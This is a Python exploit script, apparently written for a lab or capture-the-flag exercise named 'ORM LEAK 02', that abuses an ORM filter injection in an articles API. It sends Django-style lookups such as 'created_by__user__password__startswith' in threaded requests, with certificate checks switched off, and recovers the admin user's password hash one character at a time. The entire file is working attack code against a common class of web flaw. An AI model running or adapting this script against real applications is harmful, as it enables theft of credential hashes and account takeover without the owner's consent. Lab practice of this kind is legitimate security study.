import requests
import string
import json
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress InsecureRequestWarning for lab environment
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
BASE_URL = "[https://api-ptl-14ef33012386-0b276d30b296.libcurl.me/api/articles/](https://api-ptl-14ef33012386-0b276d30b296.libcurl.me/api/articles/)"
ADMIN_ID = "1" # Confirmed Admin ID for ORM LEAK 02

# Define the character set for the password hash
charset = string.ascii_letters + string.digits + "=/+$_"

MAX_HASH_LENGTH = 100 
NUM_THREADS = 10 # Number of concurrent threads
# ---------------------

leaked_password_hash = "" 

print("Starting ORM leak (threaded)...")
print(f"Targeting: {BASE_URL}")
print(f"Characters to test: {charset}")
print(f"Using {NUM_THREADS} threads.")

def test_char_request(current_prefix, char_to_test, admin_id):
    """
    Sends a single request to test if char_to_test is the next correct character.
    Returns (True, char_to_test) if a match is found, (False, char_to_test) otherwise.
    """
    test_string = current_prefix + char_to_test
    payload = {
        "created_by__user__id": admin_id,
        "created_by__user__password__startswith": test_string
    }

    try:
        response = requests.post(
            BASE_URL,
            json=payload,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
            },
            verify=False # Disable SSL verification for lab environment
        )

        if response.status_code == 200:
            response_json = response.json()
            # SUCCESS CONDITION: Non-empty JSON array with articles authored by the admin's ID
            if isinstance(response_json, list) and len(response_json) > 0:
                # Optionally, verify the returned article is indeed by the admin
                if any(article.get('author', {}).get('id') == int(admin_id) for article in response_json):
                    return True, char_to_test # Match found
        
    except requests.exceptions.RequestException as e:
        # print(f"Request error for '{test_string}': {e}") # Uncomment for debugging
        pass # Suppress connection errors for cleaner output

    return False, char_to_test # No match or error

# Main loop to find the hash character by character
for _ in range(MAX_HASH_LENGTH):
    found_char_for_position = False
    next_char = None

    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        # Submit tasks for each character in the charset concurrently
        futures = {executor.submit(test_char_request, leaked_password_hash, char, ADMIN_ID): char for char in charset}
        
        # Process results as they complete, taking the first match
        for future in as_completed(futures):
            is_match, char_tested = future.result()
            if is_match:
                next_char = char_tested
                found_char_for_position = True
                break # Found the correct character for this position, move to the next

    if found_char_for_position and next_char:
        leaked_password_hash += next_char
        print(f"  [+] Found char: '{next_char}'. Current hash: {leaked_password_hash}")
    else:
        print("\n[+] No more characters found or hash complete.")
        break

print(f"\nFinal Leaked Admin Password Hash: {leaked_password_hash}")
